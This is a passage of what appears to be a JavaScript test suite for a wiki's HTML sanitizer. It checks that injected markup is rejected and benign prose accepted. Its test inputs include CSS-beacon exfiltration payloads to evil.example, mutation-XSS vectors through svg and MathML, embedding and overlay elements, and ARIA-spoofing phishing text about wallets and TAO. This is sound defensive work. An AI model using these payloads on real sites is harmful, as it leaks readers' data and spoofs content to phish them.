rejects('Intro.\n\n<div slot="sidebar">evil</div>', 'plain slot attribute');
rejects('Intro.\n\n<  div   slot="sidebar">', 'spaced slot attribute');
rejects('Intro.\n\n<div sl&#111;t="sidebar">evil</div>', 'entity-obfuscated slot attribute');
rejects('Intro.\n\n<div s&#108;ot="sidebar">evil</div>', 'decimal-entity slot attribute');

// Inline style attributes are blocked: the <style> element is already blocked,
// but a style="" attribute on an allowed element still lets injected CSS
// exfiltrate data, overlay the page, or spoof content with no script or scheme.
rejects('Intro.\n\n<div style="background:url(//evil.example/?leak)">x</div>', 'plain style attribute');
rejects('Intro.\n\n<  p   style = "position:fixed">x</p>', 'spaced style attribute');
rejects('A link <a href="/wiki/stake/" style="color:red">stake</a> here.', 'style attribute on anchor');
// Quote-abutted / slash-abutted forms: `<img src="x"style=…>` and `<img src=x/style=…>`
// slipped the whitespace-delimited `\sstyle=` scan because there is no whitespace
// before `style`. Same quote-abutted pattern the merged contenteditable/tabindex/draggable
// and presentational-layout blocks (#496) use. style is the worst allowed attribute to
// miss because it carries every CSS primitive the merged `\sstyle=` comment lists
// (background beacons, fixed-position overlays, content spoofing).
rejects('Intro.\n\n<img src="x"style="color:red">', 'quote-abutted style attribute (double quote)');
rejects("Intro.\n\n<img src='x'style='color:red'>", 'quote-abutted style attribute (single quote)');
rejects('A link <a href="/wiki/stake/"style="background:url(//evil.example/?leak)">x</a>', 'quote-abutted style on anchor');
rejects('Intro.\n\n<img src=x/style="position:fixed">', 'slash-abutted style attribute');

// Prose that merely mentions the word "style" without an attribute assignment
// (including the "lifestyle" substring) must still pass.
accepts('The visual style of the site is defined in a separate stylesheet.', 'benign style prose');
accepts('A lifestyle choice is unrelated to CSS and must not be flagged.', 'benign lifestyle substring');
// A benign href containing the literal substring `style=` (e.g. a slug or query
// string) must not trip the quote-abutted scan after the URL text is emptied,
// the same benign-href accept case the merged ping block (#495) added.
accepts('See <a href="/wiki/stake?style=compact">stake docs</a> for details.', 'benign style= inside quoted href');

// bgcolor= is the obsolete presentational sibling of style=: it paints an arbitrary
// background colour (a fake red "alert" box) without an attribute the style= rule
// covers. Blocked like style=.
rejects('Intro.\n\n<table bgcolor="red"><tr><td>WALLET COMPROMISED</td></tr></table>', 'plain bgcolor attribute');
rejects('Intro.\n\n<  td   bgcolor = "#ff0000">x</td>', 'spaced bgcolor attribute');
accepts('The background colour of an infobox is set in the stylesheet, not inline.', 'benign bgcolor prose');

// background= loads an arbitrary external image as a tiled background — a no-script
// tracking beacon (like ping=) plus a content spoof. Blocked like bgcolor=/style=.
rejects('Intro.\n\n<body background="https://evil.example/track.png">x</body>', 'plain background attribute');
rejects('Intro.\n\n<  table   background = "//evil.example/beacon.gif">x</table>', 'spaced background attribute');
accepts('The page background is defined in the stylesheet and never set inline.', 'benign background prose');

// align=/valign= are obsolete presentational layout attributes that reposition
// content without the blocked style= attribute or <center> element. Blocked like style=.
rejects('Intro.\n\n<div align="center">Fake centered alert</div>', 'plain align attribute');
rejects('Intro.\n\n<  td   valign = "top">x</td>', 'spaced valign attribute');
accepts('Text alignment and vertical alignment are controlled by the stylesheet.', 'benign align prose');

// border=/cellpadding=/cellspacing=/hspace=/vspace= are obsolete presentational
// sizing/spacing attributes that size+space content without the blocked style=.
rejects('Intro.\n\n<table border="5" cellpadding="20">x</table>', 'plain border attribute');
rejects('Intro.\n\n<  img   hspace = "40" vspace="40">', 'spaced hspace attribute');
rejects('Intro.\n\n<td cellspacing="30">x</td>', 'plain cellspacing attribute');
accepts('Table borders and cell padding are defined in the stylesheet, not inline.', 'benign border/padding prose');

// Quote-abutted / slash-delimited forms of the presentational-layout attributes
// (align / valign / bgcolor / background / border / cellpadding / cellspacing /
// hspace / vspace) slipped the whitespace-delimited `\s…=` scans above because
// there is no whitespace before the attribute name after a prior quoted
// attribute (`<img src="x"align="top">`, `<table src="x"border="5">`). Same
// presentational-layout spoof class as the merged whitespace-delimited blocks
// (#434/#435/#436/#438); the non-space-delimited alternation catches the
// abutted forms without affecting benign URLs / class values.
rejects('Intro.\n\n<img src="x"align="top">', 'quote-abutted align attribute');
rejects('Intro.\n\n<td src="x"valign="middle">x</td>', 'quote-abutted valign attribute');
rejects('Intro.\n\n<table src="x"bgcolor="red"><tr><td>x</td></tr></table>', 'quote-abutted bgcolor attribute');
rejects('Intro.\n\n<body src="x"background="https://evil.example/track.png">x</body>', 'quote-abutted background attribute');
rejects('Intro.\n\n<img src="x"border="5">', 'quote-abutted border attribute');
rejects('Intro.\n\n<img src="x"hspace="40"vspace="40">', 'quote-abutted hspace and vspace');
rejects('Intro.\n\n<table src="x"cellpadding="10"cellspacing="10">x</table>', 'quote-abutted cellpadding/cellspacing');
rejects('Intro.\n\n<img class=x/align=top>', 'slash-abutted align attribute');
rejects('Intro.\n\n<table class=x/border=5><tr><td>x</td></tr></table>', 'slash-abutted border attribute');
// Benign class values / URLs that merely mention the attribute name still pass.
accepts('<p class="align top">centered prose</p>', 'benign align inside class value');
accepts('<a href="/wiki/stake?border=5">stake docs</a>', 'benign border= inside quoted href');

// xmlns namespace attribute assignments must not appear in article bodies.
rejects('Intro.\n\n<svg xmlns="http://www.w3.org/2000/svg"></svg>', 'plain xmlns attribute');
rejects('Intro.\n\n<svg xmlns = "http://www.w3.org/2000/svg"></svg>', 'spaced equals xmlns attribute');
rejects('Intro.\n\n<svg xmlns:xlink="http://www.w3.org/1999/xlink"></svg>', 'plain xmlns:prefix attribute');
rejects('Intro.\n\n<  svg   xmlns : xlink = "http://www.w3.org/1999/xlink">', 'spaced xmlns:prefix attribute');

// Prose that merely mentions xmlns without an attribute assignment must still pass.
accepts('The xmlns attribute declares an XML namespace in markup.', 'benign xmlns prose');
accepts('The xmlns:xlink attribute is used in SVG documents.', 'benign xmlns:prefix prose');

// <svg> and <math> are foreign-content roots and a classic mXSS vector. They are
// blocked as elements outright -- even without an xmlns attribute, an event
// handler, or a flagged scheme, which the cases below deliberately omit so they
// only pass once the element block itself is present.
rejects('Intro.\n\n<svg viewBox="0 0 1 1"><circle r="1" /></svg>', 'plain <svg> element');
rejects('Intro.\n\n<  svg  ><circle r="1" /></svg>', 'spaced <svg> element');
rejects('Intro.\n\n<math><mi>x</mi></math>', 'plain <math> element');
rejects('Intro.\n\n<  math  ><mi>x</mi></math>', 'spaced <math> element');
rejects('Intro.\n\n<foreignObject><div>evil</div></foreignObject>', 'plain <foreignObject> element');
rejects('Intro.\n\n<  foreignObject  ><p>x</p></foreignObject>', 'spaced <foreignObject> element');
// <annotation-xml> is the MathML HTML integration point (encoding="text/html"
// re-enters HTML parsing), the MathML mutation-XSS counterpart of <foreignObject>.
rejects('Intro.\n\n<annotation-xml encoding="text/html"><div>evil</div></annotation-xml>', 'plain <annotation-xml> element');
rejects('Intro.\n\n<math><annotation-xml encoding="application/xhtml+xml"><p>x</p></annotation-xml></math>', 'nested <annotation-xml> element');
rejects('Intro.\n\n<  annotation-xml  >x</annotation-xml>', 'spaced <annotation-xml> element');
// Standalone MathML fragment tags (<mi>, <mn>, <mtext>, <mrow>) bypass the <math>
// root block the same way standalone <annotation-xml> did — foreign-content parsing
// without the blocked root element.
rejects('Intro.\n\n<mi>x</mi>', 'standalone <mi> element');
rejects('Intro.\n\n<  mtext  >evil</mtext>', 'spaced <mtext> element');
rejects('Intro.\n\n<mrow><mi>x</mi></mrow>', 'standalone <mrow> element');
rejects('Intro.\n\n<mn>1</mn>', 'standalone <mn> element');

// Prose that merely names these formats without an opening tag must still pass.
accepts('SVG and MathML are XML-based formats, described here only as prose.', 'benign svg/math prose');
accepts('A foreignObject wrapper is an SVG concept described here only as prose.', 'benign foreignObject prose');
accepts('The annotation-xml integration point is described here only as prose.', 'benign annotation-xml prose');
accepts('MathML mi and mrow elements are described here only as prose.', 'benign mathml fragment prose');

// <dialog open> renders a top-layer overlay (with backdrop) and no script or
// inline style, so a raw <dialog> is a clickjacking/phishing primitive. Blocked.
rejects('Intro.\n\n<dialog open>Your wallet is compromised. Visit evil.example.</dialog>', 'plain <dialog open>');
rejects('Intro.\n\n<  dialog  >hidden modal</dialog>', 'spaced <dialog>');

// Prose that merely mentions the word "dialog" without an opening tag must pass.
accepts('A dialog box is a UI concept mentioned here only as prose.', 'benign dialog prose');

// <template> parses its contents into an inert fragment (DOM-clobbering /
// mutation-XSS / sanitizer-evasion surface) and renders nothing, so block it.
rejects('Intro.\n\n<template id="config"><a id="evil"></a></template>', 'plain <template>');
rejects('Intro.\n\n<  template  >hidden</template>', 'spaced <template>');

// Prose that merely mentions the word "template" without an opening tag must pass.
accepts('An article template is a writing convention mentioned here only as prose.', 'benign template prose');

// <fencedframe> embeds cross-origin content like <iframe> (its Privacy Sandbox
// successor), so it is the same embedding/clickjacking surface. Blocked.
rejects('Intro.\n\n<fencedframe src="https://evil.example/"></fencedframe>', 'plain <fencedframe>');
rejects('Intro.\n\n<  fencedframe  >x</fencedframe>', 'spaced <fencedframe>');

// Prose that merely mentions the word "fencedframe" without a tag must pass.
accepts('A fencedframe is an embedding primitive described here only as prose.', 'benign fencedframe prose');

// <portal> is the other experimental page-embedding element (loads + previews +
// activates another document), the same embedding/clickjacking surface as
// iframe/fencedframe. Blocked alongside the embedding family.
rejects('Intro.\n\n<portal src="https://evil.example/"></portal>', 'plain <portal>');
rejects('Intro.\n\n<  portal  >x</portal>', 'spaced <portal>');
accepts('A portal is a page-embedding primitive described here only as prose.', 'benign portal prose');

// <applet> embeds and runs a legacy Java applet — the same active-content /
// code-execution / embedding threat as the already-blocked <object> / <embed> /
// <iframe>, so it belongs in the active-embedding family the sanitizer blocks.
rejects('Intro.\n\n<applet code="Evil.class" archive="evil.jar"></applet>', 'plain <applet>');
rejects('Intro.\n\n<  applet  >x</applet>', 'spaced <applet>');
accepts('A Java applet is a legacy embedding primitive described here only as prose.', 'benign applet prose');

// <video>/<audio> render native media UI with no script; CSP media-src 'none' does not
// stop the elements from appearing. Block them like dialog and fencedframe.
rejects('Intro.\n\n<video src="/evil.mp4" controls></video>', 'plain <video>');
rejects('Intro.\n\n<  audio  src="/evil.mp3"></audio>', 'spaced <audio>');
rejects('Intro.\n\n<track src="/evil.vtt" kind="captions">', 'plain <track>');
rejects('Intro.\n\n<  track  src="/evil.vtt">', 'spaced <track>');
rejects('Intro.\n\n<picture><source srcset="https://evil.example/x.webp" type="image/webp"><img src="/wiki/fig.png" alt="x"></picture>', 'plain <picture>');
rejects('Intro.\n\n<  source  srcset="https://evil.example/x.webp">', 'spaced <source>');

// Prose that merely names these formats without an opening tag must still pass.
accepts('Video and audio codecs are discussed here only as prose.', 'benign video/audio prose');
accepts('A text track file is a media concept mentioned here without a tag.', 'benign track prose');
accepts('A picture element is an HTML concept mentioned here without a tag.', 'benign picture prose');
accepts('The source of truth for this term is documented in prose only.', 'benign source prose');

// <map>/<area> plus usemap= on <img> are client-side image-map clickjacking primitives.
rejects('Intro.\n\n<map name="evil"><area shape="rect" coords="0,0,999,999" href="https://evil.example/"></map>', 'plain <map>');
rejects('Intro.\n\n<  area  shape="rect" coords="0,0,1,1" href="https://evil.example/">', 'spaced <area>');
rejects('Intro.\n\n<img src="/wiki/fig.png" usemap="#evil" alt="diagram">', 'plain usemap attribute');
rejects('Intro.\n\n<  img   src="/wiki/fig.png"   usemap = "#evil">', 'spaced usemap attribute');
rejects('<img src="/wiki/fig.png"usemap="#evil">', 'quote-abutted usemap attribute');
rejects('<img src=x/usemap="#evil">', 'slash-delimited usemap attribute');

// Prose mentioning image maps without tags or assignments must still pass.
accepts('An image map is a UI concept described here only as prose.', 'benign map prose');
accepts('The usemap attribute pairs an image with a map element.', 'benign usemap prose');

// width=/height= on allowed <img> reserve an oversized layout box without style=.
// Tag-scoped and scanned on emptyQuotedAttributeValues() so alt text passes.
rejects('Intro.\n\n<img src="/wiki/fig.png" width="9999" height="2000" alt="x">', 'plain img width/height attributes');
rejects('Intro.\n\n<  img   src="/wiki/fig.png"   width = "800">', 'spaced img width attribute');
rejects('<img src="/wiki/fig.png"width="9999">', 'quote-abutted img width attribute');
rejects('<img src=x/height="2000">', 'slash-delimited img height attribute');
accepts('<img src="/wiki/fig.png" alt="default width=800 pixels">', 'benign width= text inside img alt');
accepts('Image width and height are described here only as prose.', 'benign width/height prose');

// width=/height= on allowed <table>/<td>/<th> reserve oversized layout boxes
// without the blocked inline style= attribute — same layout-defacement class as
// the merged border=/hspace=/vspace= (#438) on tables and width=/height= on
// <img> (#451). Closes the table-family half the #451 comment foreshadows.
rejects('Intro.\n\n<table width="5000"><tr><td>x</td></tr></table>', 'plain table width attribute');
rejects('Intro.\n\n<  table   width = "5000">x</table>', 'spaced table width attribute');
rejects('Intro.\n\n<table height="9999"><tr><td>x</td></tr></table>', 'plain table height attribute');
rejects('Intro.\n\n<table><tr><td width="100%">x</td></tr></table>', 'plain td width attribute');
rejects('Intro.\n\n<table><tr><th height="500">x</th></tr></table>', 'plain th height attribute');
rejects('Intro.\n\n<table><tr><td   height = "500">x</td></tr></table>', 'spaced td height attribute');
rejects('<table class="x"width="5000">', 'quote-abutted table width attribute');
rejects('<table class=x/width="5000">', 'slash-delimited table width attribute');
rejects('<td class="x"height="500">', 'quote-abutted td height attribute');
rejects('<td class=x/height="500">', 'slash-delimited td height attribute');

// Prose and HTML attributes that mention "width" or "height" without a real
// table-family width/height assignment must still pass.
accepts('<table><tr><td>plain cell</td></tr></table>', 'plain table with no dimensions');
accepts('Table column width and row height are described here only as prose.', 'benign width/height prose');
accepts('<table class="mw-subnets"><tr><td>x</td></tr></table>', 'benign table with class attribute only');
accepts('<td class="x-height">x</td>', 'benign unquoted class value containing height substring');

// width=/height= on allowed <tr>/<hr>/<pre> reserve oversized layout boxes
// without the blocked inline style= attribute — the remaining half of the
// dimension-attribute surface merged #451 / #465 close for <img> /
// <table>/<td>/<th>.
rejects('Intro.\n\n<hr width="5000">x</hr>', 'plain hr width attribute');
rejects('Intro.\n\n<hr   width = "5000">x</hr>', 'spaced hr width attribute');
rejects('Intro.\n\n<hr height="500">x</hr>', 'plain hr height attribute');
rejects('Intro.\n\n<table><tr height="9999"><td>x</td></tr></table>', 'plain tr height attribute');
rejects('Intro.\n\n<table><tr   height = "9999"><td>x</td></tr></table>', 'spaced tr height attribute');
rejects('Intro.\n\n<pre width="5000">x</pre>', 'plain pre width attribute');
rejects('<hr class="x"width="5000">', 'quote-abutted hr width attribute');
rejects('<hr class=x/width="5000">', 'slash-delimited hr width attribute');
rejects('<tr class="x"height="500">', 'quote-abutted tr height attribute');
rejects('<pre class="x"width="5000">', 'quote-abutted pre width attribute');

accepts('<hr>x</hr>', 'plain hr without dimensions');
accepts('<pre>x</pre>', 'plain pre without dimensions');
accepts('<table><tr><td>x</td></tr></table>', 'plain tr without dimensions');
accepts('Line width and preformatted block height are described here only as prose.', 'benign width/height prose for hr/pre');

// width=/span= on allowed <col>/<colgroup> size and stretch table columns — the
// last table-family elements left after the merged dimension surface covered
// <table>/<td>/<th> (#465) and <tr>/<hr>/<pre>. <col width="5000"> collapses the
// rest of the table; <col span="99">/<colgroup span="99"> stretches one column
// rule across the whole table. Same layout-defacement class as the merged
// #438 / #451 / #465 rules.
rejects('Intro.\n\n<table><colgroup><col width="5000"></colgroup><tr><td>x</td></tr></table>', 'plain col width attribute');
rejects('Intro.\n\n<table><colgroup><col   width = "5000"></colgroup></table>', 'spaced col width attribute');
rejects('Intro.\n\n<table><col span="99"><tr><td>x</td></tr></table>', 'plain col span attribute');
rejects('Intro.\n\n<table><colgroup span="99"></colgroup></table>', 'plain colgroup span attribute');
rejects('<table><col class="x"width="5000"></table>', 'quote-abutted col width attribute');
rejects('<table><col class=x/span="99"></table>', 'slash-delimited col span attribute');

accepts('<table><colgroup><col></colgroup><tr><td>x</td></tr></table>', 'plain col/colgroup without dimensions');
accepts('A column width and the span of a topic are described here only as prose.', 'benign col width/span prose');
accepts('<span class="badge">inline</span> and <code>colspan</code> are unrelated.', 'benign span element and colspan word are not col attributes');

// frame=/rules=/summary= on allowed <table> set obsolete presentational
// table-border attributes without the blocked inline style= attribute — same
// content-styling spoof class as the merged border=/cellpadding= (#438) and
// the table dimension attributes (#465).
rejects('Intro.\n\n<table frame="border" rules="all"><tr><td>x</td></tr></table>', 'plain table frame/rules attributes');
rejects('Intro.\n\n<table   frame = "hsides">x</table>', 'spaced table frame attribute');
rejects('Intro.\n\n<table summary="evil caption">x</table>', 'plain table summary attribute');
rejects('<table class="x"frame="border">', 'quote-abutted table frame attribute');
rejects('<table class=x/rules="all">', 'slash-delimited table rules attribute');

accepts('<table><tr><td>x</td></tr></table>', 'plain table without frame/rules/summary');
accepts('Table frame border and inner rules are described here only as prose.', 'benign table frame/rules prose');

// autofocus steals keyboard focus on page load. Tag-boundary lookahead catches
// autofocus before another attribute; no slash delimiter (class=x/autofocus is benign).
rejects('Intro.\n\n<div autofocus>trap</div>', 'bare autofocus attribute');
rejects('Intro.\n\n<div autofocus="">trap</div>', 'empty quoted autofocus attribute');
rejects('Intro.\n\n<div autofocus=\'\'>trap</div>', 'single-quoted autofocus attribute');
rejects('Intro.\n\n<div  autofocus   =   "x">trap</div>', 'spaced equals autofocus attribute');
rejects('Intro.\n\n<div autofocus/>', 'self-closing autofocus attribute');
rejects('Intro.\n\n<p autofocus=true>trap</p>', 'unquoted autofocus attribute value');
rejects('Intro.\n\n<div autofocus class="x">trap</div>', 'autofocus before another attribute');
rejects('Intro.\n\n<p autofocus id="main">trap</p>', 'autofocus mid-tag on paragraph');
rejects('Intro.\n\n<a href="/wiki/foo/" autofocus>link</a>', 'autofocus on allowed anchor');
rejects('<a href="x"autofocus>go</a>', 'quote-abutted autofocus attribute');
rejects('Intro.\n\n<div/autofocus>trap</div>', 'slash-delimited bare autofocus after tag name');
rejects('Intro.\n\n<div /autofocus>trap</div>', 'slash-delimited bare autofocus after whitespace');
rejects('<div class="x"/autofocus>trap</div>', 'quote-plus-slash-delimited bare autofocus attribute');
accepts('<div class=x/autofocus>not an autofocus attribute</div>', 'benign slash inside unquoted class value');
accepts('Autofocus the search field before the reader starts typing.', 'benign autofocus prose at sentence start');
accepts('Use autofocus carefully when designing keyboard flows.', 'benign autofocus prose mid-sentence');
accepts('<img src="/wiki/fig.png" alt="the autofocus attribute is obsolete">', 'benign autofocus word inside img alt');

// hidden removes content from layout but keeps it in the DOM — an injected hidden
// link is still navigable. Same detection as merged autofocus (#453).
rejects('Intro.\n\n<a hidden href="https://evil.example/">go</a>', 'plain hidden attribute on anchor');

// nowrap on allowed <td>/<th> disables text wrapping — a layout-defacement /
// content-spoof primitive (an injected long URL or fake wallet address breaks
// out of the column and reflows real article text off-screen), same class as
// the merged #451 / #465 cell dimension blocks.
rejects('Intro.\n\n<table><tr><td nowrap>x</td></tr></table>', 'plain td nowrap attribute');
rejects('Intro.\n\n<table><tr><th   nowrap   >x</th></tr></table>', 'spaced th nowrap attribute');
rejects('<table><tr><td class="x"nowrap>x</td></tr></table>', 'quote-abutted td nowrap attribute');
rejects('Intro.\n\n<table><tr><td/nowrap>x</td></tr></table>', 'slash-delimited td nowrap after tag name');
rejects('Intro.\n\n<table><tr><td /nowrap>x</td></tr></table>', 'slash-delimited td nowrap after whitespace');
rejects('Intro.\n\n<table><tr><td class="x"/nowrap>x</td></tr></table>', 'quote-plus-slash-delimited td nowrap attribute');

accepts('<table><tr><td>x</td></tr></table>', 'plain table without nowrap');
accepts('A nowrap attribute on a cell is described here only as prose.', 'benign nowrap prose');
accepts('<table><tr><td class=x/nowrap>x</td></tr></table>', 'benign slash inside unquoted class value before bare nowrap word');

// colspan=/rowspan= on allowed <td>/<th> merge or split cells — same layout-defacement
// class as merged #465 (table dimensions) and #479 (nowrap).
rejects('Intro.\n\n<table><tr><td colspan="99">x</td></tr></table>', 'plain td colspan attribute');
rejects('Intro.\n\n<table><tr><td   colspan = "99">x</td></tr></table>', 'spaced td colspan attribute');
rejects('Intro.\n\n<table><tr><th rowspan="99">x</th></tr></table>', 'plain th rowspan attribute');
rejects('Intro.\n\n<table><tr><th   rowspan = "99">x</th></tr></table>', 'spaced th rowspan attribute');
rejects('<td class="x"colspan="99">', 'quote-abutted td colspan attribute');
rejects('<th class=x/rowspan="99">', 'slash-delimited th rowspan attribute');

accepts('<table><tr><td>x</td></tr></table>', 'plain td without colspan/rowspan');
accepts('Column span and row span are described here only as prose.', 'benign colspan/rowspan prose');

// headers=/scope=/abbr= on allowed table cells remap which labels screen readers
// announce for headers/data cells without changing the visible table text.
rejects('Intro.\n\n<table><tr><th id="wallet">Wallet</th><td headers="wallet">evil</td></tr></table>', 'plain td headers attribute');
rejects('Intro.\n\n<table><tr><th scope="row">Wallet</th><td>x</td></tr></table>', 'plain th scope attribute');
rejects('Intro.\n\n<table><tr><th abbr="Official support">Support</th><td>x</td></tr></table>', 'plain th abbr attribute');
rejects('<table><tr><td class="x"headers="wallet">evil</td></tr></table>', 'quote-abutted td headers attribute');
rejects('<table><tr><td class=x/headers="wallet">evil</td></tr></table>', 'slash-delimited td headers attribute');
rejects('<table><tr><th class="x"scope="row">Wallet</th><td>x</td></tr></table>', 'quote-abutted th scope attribute');
rejects('<table><tr><th class=x/scope="row">Wallet</th><td>x</td></tr></table>', 'slash-delimited th scope attribute');
rejects('<table><tr><th class="x"abbr="Official">Support</th><td>x</td></tr></table>', 'quote-abutted th abbr attribute');
rejects('<table><tr><th class=x/abbr="Official">Support</th><td>x</td></tr></table>', 'slash-delimited th abbr attribute');

accepts('<table><tr><td>x</td></tr></table>', 'plain table without headers/scope/abbr');
accepts('Table headers, scope rules, and abbreviations are described here only as prose.', 'benign headers/scope/abbr prose');
accepts('<table><tr><td class="headers-demo">x</td></tr></table>', 'benign headers word inside class value');

// aria-sort=/aria-rowcount=/aria-colcount=/aria-rowindex=/aria-colindex= on
// table structures announce fake sort order, size, and cell positions to AT.
rejects('Intro.\n\n<table><tr><th aria-sort="descending">Validator</th></tr></table>', 'plain th aria-sort attribute');
rejects('Intro.\n\n<table aria-rowcount="128"><tr><td>x</td></tr></table>', 'plain table aria-rowcount attribute');
rejects('Intro.\n\n<table><tr><td aria-rowindex="99">x</td></tr></table>', 'plain td aria-rowindex attribute');
rejects('Intro.\n\n<table><tr><th aria-colindex="9">x</th></tr></table>', 'plain th aria-colindex attribute');
rejects('<table><tr><th class="x"aria-sort="ascending">Validator</th></tr></table>', 'quote-abutted th aria-sort attribute');
rejects('<table class=x/aria-colcount="99"><tr><td>x</td></tr></table>', 'slash-delimited table aria-colcount attribute');
rejects('<table><tr class=x/aria-rowindex="99"><td>x</td></tr></table>', 'slash-delimited tr aria-rowindex attribute');

accepts('<table><tr><td>x</td></tr></table>', 'plain table without table aria metadata');
accepts('ARIA sort and row index metadata are described here only as prose.', 'benign table aria metadata prose');
accepts('<table><tr><td class="aria-rowindex-demo">x</td></tr></table>', 'benign aria-rowindex word inside class value');

rejects('Intro.\n\n<div hidden>panel</div>', 'bare hidden attribute');
rejects('Intro.\n\n<div hidden class="x">panel</div>', 'hidden before another attribute');
rejects('Intro.\n\n<  p   hidden = "until-found">x</p>', 'spaced hidden attribute with value');
rejects('<a href="x"hidden>go</a>', 'quote-abutted hidden attribute');
rejects('Intro.\n\n<div/hidden>panel</div>', 'slash-delimited bare hidden after tag name');
rejects('Intro.\n\n<div /hidden>panel</div>', 'slash-delimited bare hidden after whitespace');
rejects('<div class="x"/hidden>panel</div>', 'quote-plus-slash-delimited bare hidden attribute');
accepts('<div class=x/hidden>not a hidden attribute</div>', 'benign slash inside unquoted class value');
accepts('Hidden text and hidden sections are described here only as prose.', 'benign hidden prose');
accepts('<img src="/wiki/fig.png" alt="a hidden treasure map">', 'benign hidden word inside img alt');

// aria-label=/aria-labelledby= override an element's accessible name. On allowed
// links/images this can make screen-reader output differ from visible article
// text, a no-script content-spoofing surface.
rejects('Intro.\n\n<a href="https://evil.example/" aria-label="Official staking guide">claim TAO</a>', 'plain aria-label attribute');
rejects('Intro.\n\n<img src="/wiki/fig.png" aria-labelledby="fake-caption" alt="chart">', 'plain aria-labelledby attribute');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   aria-label = "Trusted staking guide">stake</a>', 'spaced aria-label attribute');
rejects('<a href="x"aria-label="Trusted docs">go</a>', 'quote-abutted aria-label attribute');
rejects('<img src="/wiki/fig.png"/aria-labelledby="fake-caption">', 'slash-delimited aria-labelledby attribute');
accepts('ARIA labels are an accessibility concept described here only as prose.', 'benign aria label prose');
accepts('<a href="/wiki/aria-label=demo">ARIA label docs</a>', 'benign aria-label substring in quoted href');
accepts('<span class=x/aria-label-demo>ARIA label class example</span>', 'benign aria-label substring in class value');

// title= sets the native hover tooltip — same auxiliary-text spoof as merged #501 ARIA names.
rejects('Intro.\n\n<a href="https://evil.example/" title="Official staking guide">claim TAO</a>', 'plain title attribute on anchor');
rejects('Intro.\n\n<img src="/wiki/fig.png" title="Trusted chart source" alt="chart">', 'plain title attribute on img');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   title = "Trusted staking guide">stake</a>', 'spaced title attribute');
rejects('<a href="x"title="Trusted docs">go</a>', 'quote-abutted title attribute');
rejects('<img src="/wiki/fig.png"/title="Hidden caption">', 'slash-delimited title attribute');

accepts('<a href="/wiki/title=demo">title docs</a>', 'benign title substring in quoted href');
accepts('<span class=x/title-demo>title class example</span>', 'benign title substring in class value');
accepts('Article title and page title are described here only as prose.', 'benign title prose');

// aria-describedby= points assistive tech at extra description text — same family as #501/#550.
rejects('Intro.\n\n<a href="https://evil.example/" aria-describedby="fake-help">claim TAO</a>', 'plain aria-describedby attribute');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   aria-describedby = "trusted-help">stake</a>', 'spaced aria-describedby attribute');
rejects('<a href="x"aria-describedby="trusted-help">go</a>', 'quote-abutted aria-describedby attribute');
rejects('<img src="/wiki/fig.png"/aria-describedby="fake-caption">', 'slash-delimited aria-describedby attribute');

accepts('<a href="/wiki/aria-describedby=demo">ARIA describedby docs</a>', 'benign aria-describedby substring in quoted href');
accepts('ARIA describedby is an accessibility concept described here only as prose.', 'benign aria-describedby prose');

// role= overrides accessibility semantics — same family as merged #501/#550/#553.
rejects('Intro.\n\n<p role="alert">Wallet compromised — act now</p>', 'plain role=alert live-region spoof');
rejects('Intro.\n\n<a href="https://evil.example/" role="button">claim TAO</a>', 'plain role attribute on anchor');
rejects('Intro.\n\n<  p   role = "alert">x</p>', 'spaced role attribute');
rejects('<a href="x"role="button">go</a>', 'quote-abutted role attribute');
rejects('<p class=x/role="alert">x</p>', 'slash-delimited role attribute');

accepts('<a href="/wiki/role=demo">role docs</a>', 'benign role substring in quoted href');
accepts('Each subnet role and validator role are described here only as prose.', 'benign role prose');

// aria-hidden= removes subtrees from the accessibility tree — same family as #554.
rejects('Intro.\n\n<p aria-hidden="true">Do not send TAO here</p><p>Send TAO to evil.example</p>', 'plain aria-hidden dual-audience spoof');
rejects('Intro.\n\n<a href="https://evil.example/" aria-hidden="true">claim TAO</a>', 'plain aria-hidden attribute on anchor');
rejects('Intro.\n\n<  span   aria-hidden = "true">x</span>', 'spaced aria-hidden attribute');
rejects('<a href="x"aria-hidden="true">go</a>', 'quote-abutted aria-hidden attribute');
rejects('<p class=x/aria-hidden="true">x</p>', 'slash-delimited aria-hidden attribute');

accepts('<a href="/wiki/aria-hidden=demo">aria-hidden docs</a>', 'benign aria-hidden substring in quoted href');
accepts('ARIA hidden state is an accessibility concept described here only as prose.', 'benign aria-hidden prose');

// aria-live=/aria-atomic= create live regions — attribute counterpart to merged #554 role=alert.
rejects('Intro.\n\n<div aria-live="assertive">Wallet compromised — act now</div>', 'plain aria-live assertive live-region spoof');
rejects('Intro.\n\n<p aria-atomic="true">Send TAO to evil.example</p>', 'plain aria-atomic attribute');
rejects('Intro.\n\n<  div   aria-live = "polite">x</div>', 'spaced aria-live attribute');
rejects('<a href="x"aria-live="assertive">go</a>', 'quote-abutted aria-live attribute');
rejects('<div class=x/aria-atomic="true">x</div>', 'slash-delimited aria-atomic attribute');

accepts('<a href="/wiki/aria-live=demo">aria-live docs</a>', 'benign aria-live substring in quoted href');
accepts('ARIA live regions are an accessibility concept described here only as prose.', 'benign aria-live prose');

// aria-controls=/aria-expanded= fake disclosure state — same family as merged #558/#554.
rejects('Intro.\n\n<a href="https://evil.example/" aria-expanded="true">Wallet settings</a>', 'plain aria-expanded disclosure spoof');
rejects('Intro.\n\n<div aria-controls="evil-panel" id="toggle">Security panel</div>', 'plain aria-controls attribute');
rejects('Intro.\n\n<  a   aria-expanded = "true">x</a>', 'spaced aria-expanded attribute');
rejects('<a href="x"aria-expanded="true">go</a>', 'quote-abutted aria-expanded attribute');
rejects('<div class=x/aria-controls="evil-panel">x</div>', 'slash-delimited aria-controls attribute');

accepts('<a href="/wiki/aria-expanded=demo">aria-expanded docs</a>', 'benign aria-expanded substring in quoted href');
accepts('ARIA expanded state is an accessibility concept described here only as prose.', 'benign aria-expanded prose');

// aria-roledescription= overrides the accessible role description announced by
// screen readers (NVDA, JAWS, VoiceOver) — e.g. aria-roledescription="Security
// Alert" makes a plain paragraph sound like trusted system UI to AT users. Unlike
// obsolete presentational attributes, this is current WAI-ARIA 1.1+ and actively
// rendered by all major screen readers. Same spoof family as merged role (#554),
// aria-label (#501), aria-hidden (#556), aria-live (#558), aria-controls (#559).
rejects('Intro.\n\n<p aria-roledescription="Security Alert">WALLET COMPROMISED</p>', 'plain aria-roledescription attribute');
rejects('Intro.\n\n<a href="https://evil.example/" aria-roledescription="Official Notice">claim TAO</a>', 'plain aria-roledescription attribute on anchor');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   aria-roledescription = "Trusted Source">stake</a>', 'spaced aria-roledescription attribute');
